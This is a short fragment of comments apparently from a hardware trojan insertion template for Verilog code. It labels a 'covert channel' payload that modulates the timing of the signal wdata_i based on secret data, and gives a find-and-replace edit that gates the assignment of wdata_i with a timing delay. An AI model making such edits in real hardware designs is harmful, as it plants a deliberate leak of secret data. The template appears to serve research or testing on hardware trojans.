 ...
 * Payload: Modulate timing of wdata_i based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of wdata_i
//
// Integration Script Must Modify:
//
// IF wdata_i is timing-sensitive:
//   Find: assign wdata_i = ready_signal;
//   Replace: assign wdata_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
